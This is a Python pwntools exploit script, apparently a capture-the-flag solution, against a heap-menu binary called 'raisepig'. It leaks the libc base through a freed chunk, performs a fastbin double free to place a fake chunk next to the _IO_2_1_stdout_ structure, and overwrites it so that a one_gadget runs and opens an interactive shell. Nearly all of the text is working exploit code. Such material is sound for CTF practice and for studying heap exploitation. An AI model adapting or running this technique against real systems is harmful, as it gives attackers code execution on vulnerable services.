#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./raisepig"
libcPath = "./libc-64"
remoteAddr = "localhost"
remotePort = 9999

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc
    mainArena = 0x399b00
    #  oneGadget = 0x3f2d6
    oneGadget = 0xd691f

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

    mainArena = 0x3c4b20
    #  oneGadget = 0x45216
    #  oneGadget = 0x4526a
    oneGadget = 0xf1117

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Raise(length, name):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", "color")

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    Raise(0xc0, '0' * 0xc0)
    Raise(0x60, '1' * 0x60)
    Raise(0x60, '2' * 0x60)
    #  DEBUG([0xE74], True)
    Remove(0)
    #  DEBUG([0xCD3], True)
    Raise(0x90, '3' * 0x8)
    Visit()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - mainArena
    success("libc.address", libc.address)
    pause()
    
    Remove(1) # 1
    Remove(2) # 2 -> 1
    #  DEBUG([0xE74], True)
    Remove(1) # 1 -> 2 -> 1

    #  DEBUG([0xCD3], True)
    Raise(0x60, p64(libc.sym['_IO_2_1_stdout_'] + 0x98 + 5)) # 2 -> 1 -> fakeChunk
    Raise(0x60, 'a' * 0x60) # 1 -> fakeChunk
    Raise(0x60, 'b' * 0x60) # fakeChunk
    #  DEBUG([0xC8F], True)
    #  payload = '000000001111111122222222333333334444444455555555666'
    #  DEBUG([0xD82], True)
    payload = '\0' * 3 + p64(0) * 3 + p64(0x00000000ffffffff) + p64(libc.address + oneGadget) + p64(libc.sym['_IO_2_1_stdout_'] + 208 - 7 * 8) 
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(0x60))
    io.sendafter(" :", payload)

    #  Raise(0x60, payload)
 
    io.interactive()
    io.close()
